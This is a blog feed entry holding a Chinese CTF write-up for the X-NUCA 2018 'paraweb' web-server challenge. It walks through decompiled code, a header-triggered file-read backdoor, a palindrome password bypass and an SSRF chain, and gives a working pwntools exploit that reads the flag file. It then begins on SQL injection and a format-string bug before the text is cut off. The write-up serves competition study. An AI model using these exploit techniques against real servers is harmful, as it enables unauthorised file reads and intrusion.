<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p4nda&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://p4nda.top/"/>
  <updated>2018-12-07T03:23:10.824Z</updated>
  <id>http://p4nda.top/</id>
  
  <author>
    <name>P4nda</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>X-NUCA&#39;2018 Final paraweb解题思路</title>
    <link href="http://p4nda.top/2018/12/06/xnuca-final-paraweb/"/>
    <id>http://p4nda.top/2018/12/06/xnuca-final-paraweb/</id>
    <published>2018-12-06T15:12:43.000Z</published>
    <updated>2018-12-07T03:23:10.824Z</updated>
    
    <content type="html"><![CDATA[<h1 id="X-NUCA’2018-Final-paraweb解题思路"><a href="#X-NUCA’2018-Final-paraweb解题思路" class="headerlink" title="X-NUCA’2018 Final paraweb解题思路"></a>X-NUCA’2018 Final paraweb解题思路</h1><p>题目功能主要实现了一个Web服务器，首先需要搭建环境，附件及相关可从此处<a href="https://github.com/ret2p4nda/libc-pwn/tree/master/paraweb_stripped_adjustIO_final" target="_blank" rel="noopener">下载</a></p><p>需要安装的mysql-server mysql-client libmysqlclient-dev</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mysql-server mysql-client libmysqlclient-dev</span><br></pre></td></tr></table></figure><p>并将mysql的数据库root密码设置为<strong>paranoid</strong></p><p>进入mysql，创建一个叫shop的数据库，再导入给出的shop.sql就可以了。</p><p>题目分别实现了对GET方法及POST方法数据包的处理。</p><h2 id="利用点1"><a href="#利用点1" class="headerlink" title="利用点1"></a>利用点1</h2><p>题目在GET处理请求中实现了几个额外功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(haystack + <span class="number">1</span>, <span class="string">"login.html"</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = &amp;arg_start; i &lt; &amp;content_start; i += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == &amp;arg_start )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = strtok(real_url, <span class="string">"="</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = strtok(<span class="number">0L</span>L, <span class="string">"&amp;"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = strtok(<span class="number">0L</span>L, <span class="string">"="</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = strtok(<span class="number">0L</span>L, <span class="string">"&amp;"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *i = v5;</span><br><span class="line">    i[<span class="number">1</span>] = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  s1 = (<span class="keyword">char</span> *)search_from_arg(<span class="string">"username"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( s1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">const</span> <span class="keyword">char</span> *)search_from_arg(<span class="string">"password"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"admin"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)if_passwd_correct(v8) )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = (<span class="keyword">char</span> *)search_from_arg(<span class="string">"menu"</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v10 = (<span class="keyword">const</span> <span class="keyword">char</span> *)search_from_arg(<span class="string">"para"</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v9, <span class="string">"parsefile"</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              parse_file(v10);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v9, <span class="string">"request"</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              request(v10);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v9, <span class="string">"upload"</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              v2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)search_from_arg(<span class="string">"filename"</span>);</span><br><span class="line">              upload(v10, v2);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当访问页面是login.html时，会检查是否存在username和password两个参数，当判断username的值为admin时，检查password的值，在if_passwd_correct中实现了对这段password的检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">if_passwd_correct</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) &gt; <span class="number">0x40</span> || <span class="built_in">strlen</span>(a1) &lt;= <span class="number">0x13</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(a1, <span class="string">"admin"</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, a1);</span><br><span class="line">  <span class="built_in">strcat</span>(&amp;dest, a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">63</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;dest + i) != byte_60F300[<span class="number">63</span> - i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_605630 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断字符串是否在0x13到0x40间，接着判断里面是否存在admin字样，如果存在就将这个字符串复制两次到dest中去，进行64次的循环比较，比较dest的正向与byte_60F300的逆向是否相同。</p><p>可以主要到byte_60F300与dest恰好相差0x40个字节，如果输入长度是0x40的话，那么byte_60F300是相同的，而passwd检测就是输入是否是一个长度为0x40包含admin的回文序列，最简单的构造是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin111111111111111111111111111111111111111111111111111111nimda</span><br></pre></td></tr></table></figure><p>由此可以进入登录后的状态，登录后可以看到程序逻辑由menu这个键值决定，分别是parsefile（读文件）、request（发送请求）、upload（在./www/upload/里新建一个文件并输入内容）。</p><p>先看读文件，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">parse_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s1; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(ip_addr, <span class="string">"127.0.0.1"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    s1 = (<span class="keyword">char</span> *)find_from_content(<span class="string">"Credentials"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( s1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">"LG GRAM"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x51</span>uLL);</span><br><span class="line">        stream = fopen(a1, <span class="string">"rb"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( stream )</span><br><span class="line">        &#123;</span><br><span class="line">          fgets(s, <span class="number">80</span>, stream);</span><br><span class="line">          write(<span class="number">1</span>, s, <span class="number">0x50</span>uLL);</span><br><span class="line">          fclose(stream);</span><br><span class="line">          <span class="built_in">free</span>(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          perror(<span class="string">"open failure"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，仅要求数据包头包含 Credentials： LG GRAM这样一条值的话，就可以打开para指定的文件，并读取。</p><p>很显然这个是一个后门功能，可以直接读取flag。</p><p>但这个后门有一个限制，就是 !strcmp(ip_addr, “127.0.0.1”) ，这个ip_addr是从socket中取的，很难被控制，因此需要有别的方法来构造这样的请求。最开始就被坑在这里，让队友打了半天远程都打不出flag….</p><p>再关注其他功能，在request这个功能中，就包含有上述操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">request</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">size_t</span> myinput; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+18h] [rbp-2B8h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+20h] [rbp-2B0h]</span></span><br><span class="line">  <span class="keyword">char</span> *output; <span class="comment">// [rsp+28h] [rbp-2A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+38h] [rbp-298h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [rsp+40h] [rbp-290h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+50h] [rbp-280h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v11; <span class="comment">// [rsp+2C8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  myinput = <span class="built_in">strlen</span>(input);</span><br><span class="line">  output = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(myinput + <span class="number">32</span>);</span><br><span class="line">  decode_hex(output, len, (<span class="keyword">char</span> *)input);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_402876(output) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">"Creating socket failed.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      addr.sa_family = <span class="number">2</span>;</span><br><span class="line">      *(_WORD *)addr.sa_data = htons(<span class="number">0x1F90</span>u);</span><br><span class="line">      *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">      bzero(&amp;addr.sa_data[<span class="number">6</span>], <span class="number">8u</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( connect(fd, &amp;addr, <span class="number">0x10</span>u) == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        perror(<span class="string">"Connection failed.\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(</span><br><span class="line">          &amp;buf,</span><br><span class="line">          <span class="number">0x200</span>uLL,</span><br><span class="line">          <span class="string">"GET /%s HTTP/1.1\r\n"</span></span><br><span class="line">          <span class="string">"Host: 127.0.0.1\r\n"</span></span><br><span class="line">          <span class="string">"User-Agent: ComputerVendor\r\n"</span></span><br><span class="line">          <span class="string">"Cookie: nilnilnilnil\r\n"</span></span><br><span class="line">          <span class="string">"Connection: close\r\n"</span></span><br><span class="line">          <span class="string">"Identity: unknown\r\n"</span>,</span><br><span class="line">          output);</span><br><span class="line">        v3 = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">        <span class="keyword">if</span> ( send(fd, &amp;buf, v3, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"request failed."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          ptr = <span class="built_in">malloc</span>(<span class="number">0x65</span>uLL);</span><br><span class="line">          v5 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( v5 &lt;= <span class="number">6</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ++v5;</span><br><span class="line">            <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">0x64</span>uLL);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)recv(fd, ptr, <span class="number">0x64</span>uLL, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            write(<span class="number">1</span>, ptr, <span class="number">0x64</span>uLL);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">free</span>(ptr);</span><br><span class="line">          close(fd);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先将para中的参数进行处理，接着拼接到buf中去，并建立socket向127.0.0.1发送请求了。很显然只要数据构造得当，就可以构造出能读取flag的请求包。</p><p>看一下这个解码函数是什么</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__<span class="function">fastcall <span class="title">decode_hex</span><span class="params">(_BYTE *out, <span class="keyword">int</span> len, <span class="keyword">char</span> *in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *now; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 nowa; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> len_1; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  now = in;</span><br><span class="line">  v13 = out;</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  len_1 = len - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *now )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !len_1 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    --len_1;</span><br><span class="line">    v4 = now;</span><br><span class="line">    nowa = (<span class="keyword">signed</span> __int64)(now + <span class="number">1</span>);</span><br><span class="line">    v11 = sub_403042(*v4);</span><br><span class="line">    <span class="keyword">if</span> ( v11 &gt; <span class="number">0xF</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    v5 = (<span class="keyword">char</span> *)nowa;</span><br><span class="line">    now = (<span class="keyword">char</span> *)(nowa + <span class="number">1</span>);</span><br><span class="line">    v12 = sub_403042(*v5);</span><br><span class="line">    <span class="keyword">if</span> ( v12 &gt; <span class="number">0xF</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    v10 = <span class="number">16</span> * v11 + v12;</span><br><span class="line">    <span class="keyword">if</span> ( !v10 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    v6 = v13++;</span><br><span class="line">    *v6 = v10;</span><br><span class="line">  &#125;</span><br><span class="line">  *v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数将两个字符为一组进行处理，应该全部来源于0~9a~zA~Z并最终转换成0~15，低字节*16+高字节，很显然这个是一个decode(‘hex’)操作，仅需将要伪造的包字符串进行encode(‘hex’)操作就可以了</p><p>一个简单的payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'login.html?username=admin&amp;password=admin111111111111111111111111111111111111111111111111111111nimda&amp;menu=parsefile&amp;para=/opt/xnuca/flag.txt HTTP/1.1\r\nCredentials: LG GRAM\r\na: '</span></span><br></pre></td></tr></table></figure><p>将其转换成hex表示，并拼接到一个request请求包的para参数就可以拿到flag了，第一种EXP如下：</p><h3 id="EXP1-py"><a href="#EXP1-py" class="headerlink" title="EXP1.py"></a>EXP1.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"172.17.0.1"</span>,<span class="number">8080</span>)</span><br><span class="line">buf= <span class="string">'''GET /login.html?username=admin&amp;password=admin111111111111111111111111111111111111111111111111111111nimda&amp;menu=request&amp;para=6c6f67696e2e68746d6c3f757365726e616d653d61646d696e2670617373776f72643d61646d696e3131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131313131316e696d6461266d656e753d706172736566696c6526706172613d2f6f70742f786e7563612f666c61672e74787420485454502f312e310d0a43726564656e7469616c733a204c47204752414d0d0a613a20 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:8080</span></span><br><span class="line"><span class="string">Proxy-Connection: keep-alive</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Credentials: LG GRAM'''</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p.send(buf)</span><br><span class="line">p.recvuntil(<span class="string">'Try login in me.!\\r\\n\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Try login in me.!\\r\\n\n'</span>)</span><br><span class="line">flag = p.recvline()[:<span class="number">-1</span>].replace(<span class="string">'\0'</span>,<span class="string">''</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] flag:'</span>,flag</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#'login.html?username=admin&amp;password=admin111111111111111111111111111111111111111111111111111111nimda&amp;menu=parsefile&amp;para=/opt/xnuca/flag.txt HTTP/1.1\r\nCredentials: LG GRAM\r\na: '</span></span><br></pre></td></tr></table></figure><h2 id="利用点2"><a href="#利用点2" class="headerlink" title="利用点2"></a>利用点2</h2><p>说完了第一个利用，这就是一个后门操作，再看post包的处理吧</p><p>在post包中提供了两个操作，可访问cart.html和product.html</p><p>而这两个操作都构造了sql语句访问了mysql，并且都存在<strong>SQL 注入</strong>，想起被sqlmap支配的恐惧，和在国家某漏洞库实习的日子。</p><p>先看二进制漏洞，首先在cart.html中存在一个格式化字符串漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(haystack + <span class="number">1</span>, <span class="string">"cart.html"</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  strtok(qword_60F450, <span class="string">"="</span>);</span><br><span class="line">  strtok(<span class="number">0L</span>L, <span class="string">"&amp;"</span>);</span><br><span class="line">  s1 = strtok(<span class="number">0L</span>L, <span class="string">"="</span>);</span><br><span class="line">  v16 = strtok(<span class="number">0L</span>L, <span class="string">"&amp;"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( s1 &amp;&amp; v16 &amp;&amp; !<span class="built_in">strcmp</span>(s1, <span class="string">"cargo"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = sub_402A21();</span><br><span class="line">    s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x66</span>uLL);</span><br><span class="line">    <span class="built_in">snprintf</span>(s, <span class="number">0x64</span>uLL, <span class="string">"SELECT md5(%s) from cargo;"</span>, v16);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)mysql_query(v17, s) )</span><br><span class="line">      sub_402AD7(v17);</span><br><span class="line">    v19 = mysql_store_result(v17);</span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      sub_402AD7(v17);</span><br><span class="line">    mysql_fetch_row(v19);</span><br><span class="line">    v20 = (<span class="keyword">const</span> <span class="keyword">char</span> **)mysql_fetch_row(v19);</span><br><span class="line">    <span class="keyword">if</span> ( *v20 )</span><br><span class="line"> -&gt;   <span 